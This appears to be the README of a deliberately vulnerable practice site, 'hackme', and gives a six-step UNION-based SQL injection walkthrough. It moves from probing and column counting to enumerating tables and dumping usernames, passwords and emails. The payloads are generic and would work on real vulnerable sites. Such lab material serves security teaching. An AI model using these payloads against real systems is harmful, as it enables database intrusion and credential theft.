hackme
======

website for code vulnerability testing (educational purposes only)

### sql injection steps

1. Check for vulnerability

http://hackme.dev/?id=%27

2. Find the number of columns

wait for error

http://hackme.dev/?id=1 order by 1
...
http://hackme.dev/?id=1 order by 7

3. check union select to identify columns

http://hackme.dev/?id=1 union all select 1,2,3,4,5,6

4. identify table names

http://hackme.dev/?id=1 union all select 1,table_name,3,4,5,6 from information_schema.tables

5. get columns from user table

http://hackme.dev/?id=1 union all select 1,column_name,3,4,5,6 from information_schema.columns where table_name='user'

6. now select * from user table

http://hackme.dev/?id=1 union all select 1,username,password,email,5,6 from user
